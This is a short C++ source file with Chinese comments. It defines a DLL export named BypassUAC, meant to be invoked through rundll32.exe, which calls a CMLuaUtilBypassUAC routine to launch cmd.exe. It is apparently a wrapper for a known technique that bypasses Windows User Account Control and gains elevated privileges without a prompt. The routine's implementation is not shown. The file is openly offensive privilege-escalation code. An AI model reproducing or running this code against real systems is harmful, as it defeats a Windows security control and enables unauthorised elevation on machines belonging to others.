// BypassUAC2_Test.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "BypassUAC.h"


// 导出函数给rundll32.exe调用执行
void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe");
}